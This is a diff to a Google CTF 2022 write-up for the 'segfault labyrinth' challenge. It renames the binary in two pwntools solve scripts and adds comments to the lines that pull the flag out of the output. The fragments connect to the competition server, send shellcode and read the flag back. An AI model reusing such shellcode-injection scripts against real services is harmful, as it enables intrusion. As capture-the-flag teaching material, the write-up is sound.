@@ -291,7 +291,7 @@ rdi -> 0    .--> 0    .--> 0    .--> 0               --> 0
 
 from pwn import *
 
-binary = context.binary = ELF('./segfault_labyrinth', checksec=False)
+binary = context.binary = ELF('./challenge', checksec=False)
 
 if args.REMOTE:
     p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
@@ -349,7 +349,7 @@ Same as above, but just using `write` and dealing with all the garbage:
 
 from pwn import *
 
-binary = context.binary = ELF('./segfault_labyrinth', checksec=False)
+binary = context.binary = ELF('./challenge', checksec=False)
 
 if args.REMOTE:
     p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
@@ -385,8 +385,8 @@ if args.D: print(disasm(shellcode))
 assert(len(shellcode) < 0x1000)
 p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
 p.send(shellcode)
-_ = p.recvall()[900:]
-_ = _[:_.find(b'\0')].decode().strip()
+_ = p.recvall()[900:] # garbage collection
+_ = _[:_.find(b'\0')].decode().strip() # extract flag from garbage
 p.close()
 print(_)
 ```
